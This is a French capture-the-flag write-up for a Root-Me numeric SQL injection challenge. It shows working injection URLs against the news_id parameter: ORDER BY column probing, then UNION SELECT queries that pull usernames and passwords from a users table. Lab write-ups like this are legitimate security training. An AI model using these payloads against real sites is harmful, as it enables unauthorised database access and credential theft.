# SQL injection - numeric

La page de [challenge]()

## Analyse

En naviguant sur la page, on remarque que:

* Les champs de _Login_ ne semble pas vulnérables.
* Le paramètres **news_id** l'est, en cliquant sur un des articles et en testant `http://challenge01.root-me.org/web-serveur/ch18/?action=news&news_id='#`.

## Attaque

On va commancer par chercher le nombre de colones dans la bases de données ou son stockés les articles. La première tentative nous dit qu'il n'y a que de 1 à 3 colonnes.
```
http://challenge01.root-me.org/web-serveur/ch18/?action=news&news_id=1 order by 42;
http://challenge01.root-me.org/web-serveur/ch18/?action=news&news_id=1 order by 3;
```

On utilise le nom courant de table **users** en faisant un union. On remarque que les chiffres 2 et 3 s'affiche. C'est donc ses champs qu'il va falloir modifier.
```
http://challenge01.root-me.org/web-serveur/ch18/?action=news&news_id=1 union select 1,2,3 from users;
```

On utilise les noms usuelles dans les bases des données, dans notre exemple **username** et **password**.
```
http://challenge01.root-me.org/web-serveur/ch18/?action=news&news_id=1 union select 1,username,password from users
```
